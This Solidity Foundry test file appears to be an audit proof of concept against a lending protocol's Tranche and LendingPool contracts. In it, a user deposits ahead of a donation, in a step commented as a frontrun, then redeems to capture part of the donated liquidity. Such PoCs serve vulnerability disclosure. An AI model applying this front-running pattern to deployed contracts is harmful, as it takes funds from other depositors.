/**
 * Created by Pragma Labs
 * SPDX-License-Identifier: BUSL-1.1
 */
pragma solidity 0.8.22;

import {Test, console} from "lib/forge-std/src/Test.sol";
import {Tranche} from "src/Tranche.sol";
import {LendingPool} from "src/LendingPool.sol";
import {DeployTranche} from "script/Tranche.s.sol";
import {SimpleToken} from "src/ERC20token.sol";


contract PoC is Test {

LendingPool lendingPool;
Tranche tranche;
SimpleToken token;

function setUp() external {
    DeployTranche deployTranche = new DeployTranche();
    (tranche, lendingPool, token) = deployTranche.run();
}

function test_PoC() external {

    // console.log("Token Owner: ", token.owner());
    console.log("LP Owner: ", lendingPool.owner());

    address TokenOwner = token.owner();
    address user1 = address(0x1);
    address user2 = address(0x2);
    address user3 = address(0x3);


    // mint tokens to the users
    vm.startPrank(TokenOwner);
    token.mint(user1, 100e18);
    // console.log("User1 balance : ", token.balanceOf(user1));
    token.mint(user2, 100e18);
    token.mint(user3, 100e18);
    vm.stopPrank();

    // add Tranche to the LendingPool
    vm.prank(address(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38));
    lendingPool.addTranche(address(tranche), uint16(10_000));

    // user1 deposit
    vm.startPrank(user1);

    token.approve(address(lendingPool), type(uint256).max);
    uint256 shares1 = tranche.deposit(10e18, user1);
    console.log("User1 Minted Shares: ", shares1);

    vm.stopPrank();

    // user2 deposit
    vm.startPrank(user2);

    token.approve(address(lendingPool), type(uint256).max);
    uint256 shares2 = tranche.deposit(10e18, user2);
    console.log("User2 Minted Shares: ", shares2);

    vm.stopPrank();

    console.log("Total Liquidity in Pool: ", lendingPool.totalRealisedLiquidity());

    //frontrun Transaction
    vm.startPrank(user2);

    // token.approve(address(lendingPool), type(uint256).max);
    uint256 newshares2 = tranche.deposit(5e18, user2);
    console.log("User2 Mint new shares: ", newshares2);

    vm.stopPrank();

    console.log("Total Liquidity in Pool: ", lendingPool.totalRealisedLiquidity());


    // user3 donate
    vm.startPrank(user3);

    token.approve(address(lendingPool), type(uint256).max);
    lendingPool.donateToTranche(0, 10e18);

    vm.stopPrank();

    console.log("Total Liquidity in Pool After Donation: ", lendingPool.totalRealisedLiquidity());


    // user1 redeem shares
    vm.startPrank(user1);
    uint256 asset1 = tranche.redeem((shares1), user1, user1);
    console.log("User1 receive assets: ", asset1);
    vm.stopPrank();

    console.log("Total Liquidity in Pool after user 1 redeem: ", lendingPool.totalRealisedLiquidity());

    // user2 redeem shares
    vm.startPrank(user2);
    uint256 asset2 = tranche.redeem((shares2+newshares2), user2, user2);
    console.log("User2 receive assets: ", asset2);
    vm.stopPrank();

    console.log("Total Liquidity in Pool left: ", lendingPool.totalRealisedLiquidity());
}

}